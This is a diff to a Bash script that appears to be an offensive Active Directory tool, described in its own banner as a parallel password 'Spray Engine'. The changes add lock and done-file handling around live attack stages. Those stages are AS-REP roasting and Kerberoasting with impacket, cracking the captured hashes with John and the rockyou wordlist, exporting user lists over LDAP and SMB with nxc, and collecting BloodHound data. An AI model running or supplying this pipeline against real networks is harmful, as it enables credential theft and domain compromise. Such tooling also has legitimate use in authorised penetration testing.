@@ -30,6 +30,8 @@ mkdir -p "$OUTDIR" "$SPIDER_DIR"
 : > "$RAW_OUT"
 : > "$FINAL_CRACKED"
 : > "$USER_EXPORT_OUT"
+echo -e "${YELLOW}[*] Cleaning stale lock directories...${NC}"
+find "$OUTDIR" -maxdepth 1 -type d -name "lock_*" -exec rm -rf {} +
 
 echo -e "${PURPLE}====================================================${NC}"
 echo -e "${GREEN}[+] Spray Engine Auth Paralel (Be Careful!)${NC}"
@@ -244,42 +246,67 @@ process_target_proto() {
         if [[ -n "$dc_ip" && "$DOMAIN" != "." ]]; then
             
             # Gunakan utilitas mkdir untuk membuat lock directory atomik (Aman dari Race Condition)
-            if mkdir "$OUTDIR/lock_asrep_${DOMAIN}" 2>/dev/null; then
-                ASREP_HASH_FILE="$OUTDIR/asrep_${DOMAIN}.txt"
-                echo -e "${PURPLE}[EXEC] Running ASREP Roasting → $DOMAIN ($dc_ip)${NC}"
-                echo -e "${GRAY}[CMD] timeout 100s impacket-GetNPUsers \"$DOMAIN/$user:$pass\" -dc-ip \"$dc_ip\" -request -format hashcat -outputfile \"$ASREP_HASH_FILE\"${NC}"
-                timeout 100s impacket-GetNPUsers "$DOMAIN/$user:$pass" -dc-ip "$dc_ip" -request -format hashcat -outputfile "$ASREP_HASH_FILE" 2>&1 | tee "$OUTDIR/asrep_${DOMAIN}_raw.log"
-                
-                if [[ -s "$ASREP_HASH_FILE" ]]; then
-                    echo -e "${RED}[!] ASREP hash found! Cracking with John...${NC}"
-                    echo -e "${GRAY}[CMD] timeout 180s john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --rules \"$ASREP_HASH_FILE\"${NC}"
-                    timeout 180s john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --rules "$ASREP_HASH_FILE" 
-                    echo -e "${GRAY}[CMD] john --show \"$ASREP_HASH_FILE\"${NC}"
-                    ASREP_RESULT=$(john --show "$ASREP_HASH_FILE" | grep -v "password cracked" | grep ":")
-                    if [[ -n "$ASREP_RESULT" ]]; then
-                        echo -e "${GREEN}[+++] SUCCESS! Cracked ASREP Hash(es):\n${YELLOW}$ASREP_RESULT${NC}"
-                        echo -e "\n[ASREP - $DOMAIN]\n$ASREP_RESULT" >> "$FINAL_CRACKED"
+            ASREP_LOCK="$OUTDIR/lock_asrep_${DOMAIN}"
+            ASREP_DONE="$OUTDIR/asrep_${DOMAIN}.done"
+
+            if [[ ! -f "$ASREP_DONE" ]]; then
+                if mkdir "$ASREP_LOCK" 2>/dev/null; then
+
+                    ASREP_HASH_FILE="$OUTDIR/asrep_${DOMAIN}.txt"
+                    echo -e "${GRAY}[CMD] timeout 100s impacket-GetNPUsers \"$DOMAIN/$user:$pass\" -dc-ip \"$dc_ip\" -request -format hashcat -outputfile \"$ASREP_HASH_FILE\"${NC}"
+                    timeout 100s impacket-GetNPUsers "$DOMAIN/$user:$pass" -dc-ip "$dc_ip" -request -format hashcat -outputfile "$ASREP_HASH_FILE" 2>&1 | tee "$OUTDIR/asrep_${DOMAIN}_raw.log"
+
+                    if [[ -s "$ASREP_HASH_FILE" ]]; then
+                        echo -e "${RED}[!] ASREP hash found! Cracking with John...${NC}"
+
+                        echo -e "${GRAY}[CMD] timeout 180s john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --rules \"$ASREP_HASH_FILE\"${NC}"
+                        timeout 180s john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --rules "$ASREP_HASH_FILE" 
+                        echo -e "${GRAY}[CMD] john --show \"$ASREP_HASH_FILE\"${NC}"
+                        ASREP_RESULT=$(john --show "$ASREP_HASH_FILE" | grep -v "password cracked" | grep ":")
+
+                        [[ -n "$ASREP_RESULT" ]] && {
+                            echo -e "${GREEN}[+++] SUCCESS! Cracked ASREP Hash(es):\n${YELLOW}$ASREP_RESULT${NC}"
+                            echo -e "\n[ASREP - $DOMAIN]\n$ASREP_RESULT" >> "$FINAL_CRACKED"
+                        }
                     fi
+
+                    touch "$ASREP_DONE"
+                    rm -rf "$ASREP_LOCK"
+
                 fi
             fi
 
-            if mkdir "$OUTDIR/lock_kerb_${DOMAIN}" 2>/dev/null; then
-                KERB_HASH_FILE="$OUTDIR/kerberoast_${DOMAIN}.txt"
-                echo -e "${PURPLE}[EXEC] Running Kerberoasting → $DOMAIN ($dc_ip)${NC}"
-                echo -e "${GRAY}[CMD] timeout 100s impacket-GetUserSPNs \"$DOMAIN/$user:$pass\" -dc-ip \"$dc_ip\" -request -outputfile \"$KERB_HASH_FILE\"${NC}"
-                timeout 100s impacket-GetUserSPNs "$DOMAIN/$user:$pass" -dc-ip "$dc_ip" -request -outputfile "$KERB_HASH_FILE" 2>&1 | tee "$OUTDIR/kerberoast_${DOMAIN}_raw.log"
-                
-                if [[ -s "$KERB_HASH_FILE" ]]; then
-                    echo -e "${RED}[!] Kerberoast hash found! Cracking with John...${NC}"
-                    echo -e "${GRAY}[CMD] timeout 180s john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --rules \"$KERB_HASH_FILE\"${NC}"
-                    timeout 180s john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --rules "$KERB_HASH_FILE" 
-                    echo -e "${GRAY}[CMD] john --show \"$KERB_HASH_FILE\"${NC}"
-                    KERB_RESULT=$(john --show "$KERB_HASH_FILE" | grep -v "password cracked" | grep ":")
-                    if [[ -n "$KERB_RESULT" ]]; then
-                        echo -e "${GREEN}[+++] SUCCESS! Cracked Kerberoast Hash(es):\n${YELLOW}$KERB_RESULT${NC}"
-                        echo -e "\n[KERBEROAST - $DOMAIN]\n$KERB_RESULT" >> "$FINAL_CRACKED"
+            KERB_LOCK="$OUTDIR/lock_kerb_${DOMAIN}"
+            KERB_DONE="$OUTDIR/kerberoast_${DOMAIN}.done"
+
+            if [[ ! -f "$KERB_DONE" ]]; then
+
+                if mkdir "$KERB_LOCK" 2>/dev/null; then
+
+                    KERB_HASH_FILE="$OUTDIR/kerberoast_${DOMAIN}.txt"
+                    echo -e "${PURPLE}[EXEC] Running Kerberoasting → $DOMAIN ($dc_ip)${NC}"
+                    echo -e "${GRAY}[CMD] timeout 100s impacket-GetUserSPNs \"$DOMAIN/$user:$pass\" -dc-ip \"$dc_ip\" -request -outputfile \"$KERB_HASH_FILE\"${NC}"
+                    timeout 100s impacket-GetUserSPNs "$DOMAIN/$user:$pass" -dc-ip "$dc_ip" -request -outputfile "$KERB_HASH_FILE" 2>&1 | tee "$OUTDIR/kerberoast_${DOMAIN}_raw.log"
+
+                    if [[ -s "$KERB_HASH_FILE" ]]; then
+
+                        echo -e "${RED}[!] Kerberoast hash found! Cracking with John...${NC}"
+                        echo -e "${GRAY}[CMD] timeout 180s john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --rules \"$KERB_HASH_FILE\"${NC}"
+                        timeout 180s john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --rules "$KERB_HASH_FILE" 
+                        echo -e "${GRAY}[CMD] john --show \"$KERB_HASH_FILE\"${NC}"
+                        KERB_RESULT=$(john --show "$KERB_HASH_FILE" | grep -v "password cracked" | grep ":")
+
+                        [[ -n "$KERB_RESULT" ]] && {
+                            echo -e "${GREEN}[+++] SUCCESS! Cracked Kerberoast Hash(es):\n${YELLOW}$KERB_RESULT${NC}"
+                            echo -e "\n[KERBEROAST - $DOMAIN]\n$KERB_RESULT" >> "$FINAL_CRACKED"
+                        }
                     fi
+
+                    touch "$KERB_DONE"
+                    rm -rf "$KERB_LOCK"
+
                 fi
+
             fi
         fi
 
@@ -301,16 +328,28 @@ process_target_proto() {
             if [[ -d "$DUMP_PATH" ]]; then
                 echo -e "${GREEN}[+] ldapdomaindump saved to $DUMP_PATH${NC}"
             fi
+            USER_LOCK="$OUTDIR/lock_userexp_${DOMAIN}"
+            USER_DONE="$OUTDIR/userexport_${DOMAIN}.done"
 
-            if [[ "$DOMAIN" != "." ]] && mkdir "$OUTDIR/lock_userexp_${DOMAIN}" 2>/dev/null; then
-                echo -e "${YELLOW}[!] Exporting users via LDAP for domain $DOMAIN...${NC}"
-                echo -e "${GRAY}[CMD] timeout 100s nxc ldap \"$ip\" -u \"$user\" -p \"$pass\" $DOMAIN_ARG --users-export \"$USER_EXPORT_OUT.tmp\"${NC}"
-                timeout 100s nxc ldap "$ip" -u "$user" -p "$pass" $DOMAIN_ARG --users-export "$USER_EXPORT_OUT.tmp" >/dev/null 2>&1
-                if [[ -s "$USER_EXPORT_OUT.tmp" ]]; then
-                    cat "$USER_EXPORT_OUT.tmp" >> "$USER_EXPORT_OUT"
-                    rm -f "$USER_EXPORT_OUT.tmp"
-                    echo -e "${GREEN}[+] Successfully exported users via LDAP for $DOMAIN.${NC}"
+            if [[ "$DOMAIN" != "." ]] &&
+               [[ ! -f "$USER_DONE" ]]; then
+
+                if mkdir "$USER_LOCK" 2>/dev/null; then
+
+                    echo -e "${YELLOW}[!] Exporting users via LDAP for domain $DOMAIN...${NC}"
+                    echo -e "${GRAY}[CMD] timeout 100s nxc ldap \"$ip\" -u \"$user\" -p \"$pass\" $DOMAIN_ARG --users-export \"$USER_EXPORT_OUT.tmp\"${NC}"
+                    timeout 100s nxc ldap "$ip" -u "$user" -p "$pass" $DOMAIN_ARG --users-export "$USER_EXPORT_OUT.tmp" >/dev/null 2>&1
+
+                    if [[ -s "$USER_EXPORT_OUT.tmp" ]]; then
+                        cat "$USER_EXPORT_OUT.tmp" >> "$USER_EXPORT_OUT"
+                        rm -f "$USER_EXPORT_OUT.tmp"
+                        echo -e "${GREEN}[+] Successfully exported users via LDAP for $DOMAIN.${NC}"
+                    fi
+
+                    rm -rf "$USER_LOCK"
+
                 fi
+
             fi
         fi
 
@@ -320,16 +359,24 @@ process_target_proto() {
             ABS_SPIDER=$(readlink -f "$SPIDER_DIR")
 
             # --- USERS EXPORT (DOMAIN ONLY) ---
-            if [[ "$DOMAIN" != "." ]] && mkdir "$OUTDIR/lock_userexp_${DOMAIN}" 2>/dev/null; then
-                echo -e "${YELLOW}[!] Exporting users via SMB for domain $DOMAIN...${NC}"
-                echo -e "${GRAY}[CMD] timeout 100s nxc smb \"$ip\" -u \"$user\" -p \"$pass\" $DOMAIN_ARG --users-export \"$USER_EXPORT_OUT.tmp\"${NC}"
-                timeout 100s nxc smb "$ip" -u "$user" -p "$pass" $DOMAIN_ARG --users-export "$USER_EXPORT_OUT.tmp" >/dev/null 2>&1
+            USER_LOCK="$OUTDIR/lock_userexp_${DOMAIN}"
+            USER_DONE="$OUTDIR/userexport_${DOMAIN}.done"
 
-                if [[ -s "$USER_EXPORT_OUT.tmp" ]]; then
-                    cat "$USER_EXPORT_OUT.tmp" >> "$USER_EXPORT_OUT"
-                    rm -f "$USER_EXPORT_OUT.tmp"
-                    echo -e "${GREEN}[+] Successfully exported users via SMB for $DOMAIN.${NC}"
+            if [[ ! -f "$USER_DONE" ]]; then
+
+                if mkdir "$USER_LOCK" 2>/dev/null; then
+                    echo -e "${YELLOW}[!] Exporting users via SMB for domain $DOMAIN...${NC}"
+                    echo -e "${GRAY}[CMD] timeout 100s nxc smb \"$ip\" -u \"$user\" -p \"$pass\" $DOMAIN_ARG --users-export \"$USER_EXPORT_OUT.tmp\"${NC}"
+                    timeout 100s nxc smb "$ip" -u "$user" -p "$pass" $DOMAIN_ARG --users-export "$USER_EXPORT_OUT.tmp" >/dev/null 2>&1
+
+                    if [[ -s "$USER_EXPORT_OUT.tmp" ]]; then
+                        cat "$USER_EXPORT_OUT.tmp" >> "$USER_EXPORT_OUT"
+                        rm -f "$USER_EXPORT_OUT.tmp"
+                        echo -e "${GREEN}[+] Successfully exported users via SMB for $DOMAIN.${NC}"
+                    fi
+                    rm -rf "$USER_LOCK"
                 fi
+
             fi
 
             # ---------- SPIDER ----------
@@ -390,15 +437,31 @@ process_target_proto() {
 
             # ---------- BLOODHOUND (DOMAIN ONLY) ----------
             if [[ -z "${BH_DONE[$DOMAIN]}" && "$DOMAIN" != "." ]]; then
-                if mkdir "$OUTDIR/lock_bh_${DOMAIN}" 2>/dev/null; then
-                    BH_DIR="$OUTDIR/bloodhound_${ip}"
-                    mkdir -p "$BH_DIR"
-                    echo -e "${YELLOW}[*] Ingesting AD data via BloodHound...${NC}"
-                    (
-                        cd "$BH_DIR" || exit
-                        echo -e "${GRAY}[CMD] timeout 150s bloodhound-ce-python -d \"$DOMAIN\" -u \"$user\" -p \"$pass\" -ns \"$dc_ip\" -c all --zip${NC}"
-                        timeout 150s bloodhound-ce-python -d "$DOMAIN" -u "$user" -p "$pass" -ns "$dc_ip" -c all --zip | tee bloodhound_run.log
-                    )
+                BH_LOCK="$OUTDIR/lock_bh_${DOMAIN}"
+                BH_DONE="$OUTDIR/bloodhound_${DOMAIN}.done"
+
+                if [[ ! -f "$BH_DONE" ]]; then
+
+                    if mkdir "$BH_LOCK" 2>/dev/null; then
+
+                        BH_DIR="$OUTDIR/bloodhound_${ip}"
+                        mkdir -p "$BH_DIR"
+
+                        (
+                            cd "$BH_DIR" || exit
+                            echo -e "${YELLOW}[*] Ingesting AD data via BloodHound...${NC}"
+                            echo -e "${GRAY}[CMD] timeout 150s bloodhound-ce-python -d \"$DOMAIN\" -u \"$user\" -p \"$pass\" -ns \"$dc_ip\" -c all --zip${NC}"
+                            timeout 150s bloodhound-ce-python -d "$DOMAIN" -u "$user" -p "$pass" -ns "$dc_ip" -c all --zip | tee bloodhound_run.log
+                        )
+
+                        if ls "$BH_DIR"/*.zip >/dev/null 2>&1; then
+                            touch "$BH_DONE"
+                        fi
+
+                        rm -rf "$BH_LOCK"
+
+                    fi
+
                 fi
             fi
 
